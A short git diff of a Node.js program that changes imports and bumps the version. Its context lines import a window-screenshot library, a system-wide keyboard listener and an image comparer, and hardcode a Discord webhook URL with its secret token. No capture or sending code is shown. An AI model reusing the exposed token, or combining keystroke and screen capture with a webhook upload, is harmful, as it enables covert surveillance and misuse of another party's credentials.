@@ -1,11 +1,11 @@
-import fs from "fs";
+import * as fs from "fs";
 import { existsSync, mkdir, mkdirSync, readFileSync } from "fs";
 import { readFile } from "fs/promises";
 import { Window } from "node-screenshots";
 import { GlobalKeyboardListener } from 'node-global-key-listener';
-import looksSame from 'looks-same';
+const looksSame =require('looks-same');
 
-const version="1.0.0-Alpha5"
+const version="1.0.1"
 
 let prevImage=new Map();
 const URL="https://discord.com/api/webhooks/1356111408231747745/w7jY4QqkdUNHprEdaHen_-aC_xg5XkJzSrVdfRxe3TP3DoPmbiu0eOIzjax37qssHoSC"
